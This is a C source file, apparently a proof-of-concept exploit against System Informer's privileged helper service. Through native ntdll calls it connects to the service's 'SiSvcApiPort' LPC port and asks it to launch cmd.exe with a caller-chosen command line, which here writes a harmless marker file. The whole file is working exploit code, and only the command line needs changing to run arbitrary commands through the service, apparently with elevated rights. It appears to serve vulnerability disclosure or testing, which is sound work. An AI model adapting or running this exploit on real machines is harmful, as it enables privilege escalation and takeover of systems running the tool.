#include <windows.h>
#include <shellapi.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

typedef LONG NTSTATUS;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#ifndef STATUS_NO_MEMORY
#define STATUS_NO_MEMORY ((NTSTATUS)0xC0000017L)
#endif
#define PH_SVC_API_CREATE_PROCESS_IGNORE_IFEO_DEBUGGER 16

#ifndef NTAPI
#define NTAPI __stdcall
#endif

#ifndef SECURITY_DYNAMIC_TRACKING
#define SECURITY_DYNAMIC_TRACKING 1
#endif

#ifndef SecurityImpersonation
#define SecurityImpersonation 2
#endif

typedef struct _UNICODE_STRING_LOCAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_LOCAL, *PUNICODE_STRING_LOCAL;

typedef struct _CLIENT_ID_LOCAL {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_LOCAL;

typedef struct _PORT_MESSAGE_LOCAL {
    union {
        struct {
            SHORT DataLength;
            SHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            SHORT Type;
            SHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID_LOCAL ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE_LOCAL, *PPORT_MESSAGE_LOCAL;

typedef struct _PORT_VIEW_LOCAL {
    ULONG Length;
    HANDLE SectionHandle;
    ULONG SectionOffset;
    SIZE_T ViewSize;
    PVOID ViewBase;
    PVOID ViewRemoteBase;
} PORT_VIEW_LOCAL, *PPORT_VIEW_LOCAL;

typedef struct _REMOTE_PORT_VIEW_LOCAL {
    ULONG Length;
    SIZE_T ViewSize;
    PVOID ViewBase;
} REMOTE_PORT_VIEW_LOCAL, *PREMOTE_PORT_VIEW_LOCAL;

typedef struct _PH_RELATIVE_STRINGREF_LOCAL {
    ULONG Length;
    ULONG Offset;
} PH_RELATIVE_STRINGREF_LOCAL;

typedef struct _PHSVC_API_CONNECTINFO_LOCAL {
    ULONG ServerProcessId;
} PHSVC_API_CONNECTINFO_LOCAL;

typedef union _PHSVC_API_PAYLOAD_LOCAL {
    PHSVC_API_CONNECTINFO_LOCAL ConnectInfo;
    struct {
        ULONG ApiNumber;
        NTSTATUS ReturnStatus;
        union {
            struct {
                PH_RELATIVE_STRINGREF_LOCAL FileName;
                PH_RELATIVE_STRINGREF_LOCAL CommandLine;
            } CreateProcessIgnoreIfeoDebugger;
        } u;
    };
} PHSVC_API_PAYLOAD_LOCAL;

typedef struct _PHSVC_API_MSG_LOCAL {
    PORT_MESSAGE_LOCAL h;
    PHSVC_API_PAYLOAD_LOCAL p;
} PHSVC_API_MSG_LOCAL;

typedef NTSTATUS (NTAPI *PFN_NtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *PFN_NtConnectPort)(PHANDLE, PUNICODE_STRING_LOCAL, PSECURITY_QUALITY_OF_SERVICE, PPORT_VIEW_LOCAL, PREMOTE_PORT_VIEW_LOCAL, PULONG, PVOID, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtRequestWaitReplyPort)(HANDLE, PPORT_MESSAGE_LOCAL, PPORT_MESSAGE_LOCAL);
typedef NTSTATUS (NTAPI *PFN_NtClose)(HANDLE);
typedef PVOID (NTAPI *PFN_RtlCreateHeap)(ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID);
typedef PVOID (NTAPI *PFN_RtlAllocateHeap)(PVOID, ULONG, SIZE_T);
typedef BOOLEAN (NTAPI *PFN_RtlFreeHeap)(PVOID, ULONG, PVOID);
typedef PVOID (NTAPI *PFN_RtlDestroyHeap)(PVOID);
typedef NTSTATUS (NTAPI *PFN_RtlSetHeapInformation)(PVOID, HEAP_INFORMATION_CLASS, PVOID, SIZE_T);

static PFN_NtCreateSection pNtCreateSection;
static PFN_NtConnectPort pNtConnectPort;
static PFN_NtRequestWaitReplyPort pNtRequestWaitReplyPort;
static PFN_NtClose pNtClose;
static PFN_RtlCreateHeap pRtlCreateHeap;
static PFN_RtlAllocateHeap pRtlAllocateHeap;
static PFN_RtlFreeHeap pRtlFreeHeap;
static PFN_RtlDestroyHeap pRtlDestroyHeap;
static PFN_RtlSetHeapInformation pRtlSetHeapInformation;

#define RESOLVE_NTDLL(Name, Type) (Name = (Type)(void *)GetProcAddress(ntdll, #Name + 1))

static void init_unicode_string(PUNICODE_STRING_LOCAL s, PCWSTR value)
{
    SIZE_T bytes = wcslen(value) * sizeof(WCHAR);
    s->Length = (USHORT)bytes;
    s->MaximumLength = (USHORT)(bytes + sizeof(WCHAR));
    s->Buffer = (PWSTR)value;
}

static void write_text(PCWSTR path, PCWSTR text)
{
    HANDLE file = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(file, text, (DWORD)(wcslen(text) * sizeof(WCHAR)), &written, NULL);
        CloseHandle(file);
    }
}

static BOOL resolve_ntdll(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;

    RESOLVE_NTDLL(pNtCreateSection, PFN_NtCreateSection);
    RESOLVE_NTDLL(pNtConnectPort, PFN_NtConnectPort);
    RESOLVE_NTDLL(pNtRequestWaitReplyPort, PFN_NtRequestWaitReplyPort);
    RESOLVE_NTDLL(pNtClose, PFN_NtClose);
    RESOLVE_NTDLL(pRtlCreateHeap, PFN_RtlCreateHeap);
    RESOLVE_NTDLL(pRtlAllocateHeap, PFN_RtlAllocateHeap);
    RESOLVE_NTDLL(pRtlFreeHeap, PFN_RtlFreeHeap);
    RESOLVE_NTDLL(pRtlDestroyHeap, PFN_RtlDestroyHeap);
    RESOLVE_NTDLL(pRtlSetHeapInformation, PFN_RtlSetHeapInformation);

    return pNtCreateSection && pNtConnectPort && pNtRequestWaitReplyPort && pNtClose &&
        pRtlCreateHeap && pRtlAllocateHeap && pRtlFreeHeap && pRtlDestroyHeap &&
        pRtlSetHeapInformation;
}

static PVOID make_shared_string(PVOID heap, PCWSTR value, PH_RELATIVE_STRINGREF_LOCAL *ref)
{
    SIZE_T length = wcslen(value) * sizeof(WCHAR);
    PBYTE memory = (PBYTE)pRtlAllocateHeap(heap, HEAP_ZERO_MEMORY, length);
    if (!memory)
        return NULL;

    memcpy(memory, value, length);
    ref->Length = (ULONG)length;
    ref->Offset = (ULONG)(memory - (PBYTE)heap);
    return memory;
}

static NTSTATUS connect_and_execute(PCWSTR marker_path)
{
    UNICODE_STRING_LOCAL port_name;
    HANDLE section = NULL;
    HANDLE port = NULL;
    LARGE_INTEGER section_size;
    PORT_VIEW_LOCAL client_view;
    REMOTE_PORT_VIEW_LOCAL server_view;
    SECURITY_QUALITY_OF_SERVICE qos;
    ULONG max_message_length = 0;
    PHSVC_API_CONNECTINFO_LOCAL connect_info;
    ULONG connect_info_length;
    PVOID heap = NULL;
    ULONG heap_compatibility = 2;
    NTSTATUS status;

    init_unicode_string(&port_name, L"\\BaseNamedObjects\\SiSvcApiPort");
    section_size.QuadPart = 8ull * 1024ull * 1024ull;

    status = pNtCreateSection(&section, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status))
        return status;

    ZeroMemory(&client_view, sizeof(client_view));
    client_view.Length = sizeof(client_view);
    client_view.SectionHandle = section;
    client_view.ViewSize = (SIZE_T)section_size.QuadPart;

    ZeroMemory(&server_view, sizeof(server_view));
    server_view.Length = sizeof(server_view);

    ZeroMemory(&qos, sizeof(qos));
    qos.Length = sizeof(qos);
    qos.ImpersonationLevel = SecurityImpersonation;
    qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    qos.EffectiveOnly = TRUE;

    ZeroMemory(&connect_info, sizeof(connect_info));
    connect_info_length = sizeof(connect_info);

    status = pNtConnectPort(&port, &port_name, &qos, &client_view, &server_view, &max_message_length, &connect_info, &connect_info_length);
    pNtClose(section);

    if (!NT_SUCCESS(status))
        return status;

    heap = pRtlCreateHeap(0, client_view.ViewBase, client_view.ViewSize, 0x1000, NULL, NULL);
    if (!heap) {
        pNtClose(port);
        return STATUS_NO_MEMORY;
    }

    pRtlSetHeapInformation(heap, HeapCompatibilityInformation, &heap_compatibility, sizeof(heap_compatibility));

    {
        WCHAR command_line[MAX_PATH * 4];
        PHSVC_API_MSG_LOCAL msg;
        PVOID file_mem;
        PVOID cmd_mem;

        swprintf(command_line, sizeof(command_line) / sizeof(command_line[0]), L"\"C:\\Windows\\System32\\cmd.exe\" /c echo SYSTEMINFORMER_PHSVC_POC>\"%ls\"", marker_path);

        ZeroMemory(&msg, sizeof(msg));
        msg.p.ApiNumber = PH_SVC_API_CREATE_PROCESS_IGNORE_IFEO_DEBUGGER;
        file_mem = make_shared_string(heap, L"C:\\Windows\\System32\\cmd.exe", &msg.p.u.CreateProcessIgnoreIfeoDebugger.FileName);
        cmd_mem = make_shared_string(heap, command_line, &msg.p.u.CreateProcessIgnoreIfeoDebugger.CommandLine);

        if (!file_mem || !cmd_mem) {
            status = STATUS_NO_MEMORY;
        } else {
            msg.h.u1.s1.DataLength = sizeof(PHSVC_API_MSG_LOCAL) - offsetof(PHSVC_API_MSG_LOCAL, p);
            msg.h.u1.s1.TotalLength = sizeof(PHSVC_API_MSG_LOCAL);
            msg.h.u2.ZeroInit = 0;
            status = pNtRequestWaitReplyPort(port, &msg.h, &msg.h);
            if (NT_SUCCESS(status))
                status = msg.p.ReturnStatus;
        }

        if (cmd_mem)
            pRtlFreeHeap(heap, 0, cmd_mem);
        if (file_mem)
            pRtlFreeHeap(heap, 0, file_mem);
    }

    pRtlDestroyHeap(heap);
    pNtClose(port);
    return status;
}

static void default_marker_path(PWSTR buffer, DWORD count, PCWSTR leaf)
{
    DWORD used = GetTempPathW(count, buffer);
    if (!used || used >= count) {
        wcsncpy(buffer, L".\\", count - 1);
        buffer[count - 1] = 0;
    }
    wcsncat(buffer, leaf, count - wcslen(buffer) - 1);
}

static void run_probe(PCWSTR marker_path)
{
    WCHAR marker[MAX_PATH * 2];
    WCHAR status_path[MAX_PATH * 2];
    WCHAR status_text[256];
    NTSTATUS status;

    if (marker_path && marker_path[0]) {
        wcsncpy(marker, marker_path, (sizeof(marker) / sizeof(marker[0])) - 1);
        marker[(sizeof(marker) / sizeof(marker[0])) - 1] = 0;
    } else {
        default_marker_path(marker, sizeof(marker) / sizeof(marker[0]), L"systeminformer_phsvc_poc.txt");
    }

    swprintf(status_path, sizeof(status_path) / sizeof(status_path[0]), L"%ls.status", marker);

    if (!resolve_ntdll()) {
        write_text(status_path, L"resolve_ntdll_failed");
        return;
    }

    status = connect_and_execute(marker);
    swprintf(status_text, sizeof(status_text) / sizeof(status_text[0]), L"status=0x%08lx", (ULONG)status);
    write_text(status_path, status_text);
}

__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR cmdline, int ncmdshow)
{
    int argc = 0;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    PCWSTR marker_path = NULL;

    (void)hwnd;
    (void)hinst;
    (void)cmdline;
    (void)ncmdshow;

    if (argv && argc >= 3)
        marker_path = argv[argc - 1];

    run_probe(marker_path);

    if (argv)
        LocalFree(argv);
}

#ifdef BUILD_EXE
int wmain(int argc, wchar_t **argv)
{
    run_probe(argc >= 2 ? argv[1] : NULL);
    return 0;
}
#endif
